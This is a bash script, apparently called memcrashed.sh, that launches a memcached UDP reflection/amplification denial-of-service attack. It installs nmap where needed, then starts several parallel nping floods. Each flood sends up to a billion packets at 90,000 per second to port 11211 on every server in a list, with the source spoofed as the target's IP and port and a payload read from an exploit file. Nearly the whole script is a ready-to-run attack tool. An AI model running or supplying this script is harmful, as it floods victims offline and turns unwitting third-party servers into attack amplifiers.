#!/usr/bin/sudo /bin/bash
i=0
if type lsb_release >/dev/null 2>&1; then
  distro=$(lsb_release -i -s)
elif [ -e /etc/os-release ]; then
  distro=$(awk -F= '$1 == "ID" {print 2}' /etc/os-release)
else
  echo "Error: Cannot find release file"; exit 1
fi

if [ -z "$(which nping)" ]; then
  echo "nmap not installed; installing"
  case $distro in
      [Uu]buntu*) apt-get -y install nmap ;;
      [Dd]ebian*) apt-get -y install nmap ;;
      [Mm]int*)   apt-get -y install nmap ;;
      [Kk]ali*)   apt-get -y install nmap ;;
      [Ff]edora*) yum install nmap; dnf install nmap ;;
      [Ss]u[Ss][Ee]*)   zypper addrepo https://download.opensuse.org/repositories/network:utilities/openSUSE_Leap_42.3/network:utilities.repo; zypper refresh; zypper install nmap ;;
      [Cc]ent[Oo][Ss]*) yum install nmap ;;
      [Rr][Hh][Ee][Ll]*)   yum install nmap ;;
      [Aa]rch*)   pacman -Sy nmap ;;
      [Gg]entoo*) USE="-gtk -gnome" emerge -pv nmap ;;
      *)       echo "Error: Unknown distribution $distro"; exit 1 ;;
  esac
else
  if [ -z $1 ]; then
    echo "Usage: ./memcrashed.sh TARGET PORT MULTIPLIER, where \
    TARGET is the IP address to attack, \
    PORT is the port to attack on the target, \
    and MULTIPLIER is the number of simultaneous process to run."
  elif [ -z $2 ]; then
    echo "Usage: ./memcrashed.sh TARGET PORT MULTIPLIER, where \
    TARGET is the IP address to attack, \
    PORT is the port to attack on the target, \
    and MULTIPLIER is the number of simultaneous process to run."
  elif [ -z $3 ]; then
    echo "Usage: ./memcrashed.sh TARGET PORT MULTIPLIER, where \
    TARGET is the IP address to attack, \
    PORT is the port to attack on the target, \
    and MULTIPLIER is the number of simultaneous process to run."
  else
    while [ $i -lt $3 ]; do
      exploit="$(cat exploit.txt)"
      nping -c 1000000000 --rate 90000 --udp -S $1 -g $2 -p 11211 --data $exploit $(tr '\n' ' '<ips.txt) &
      i=$[$i+1]
    done
  fi
fi
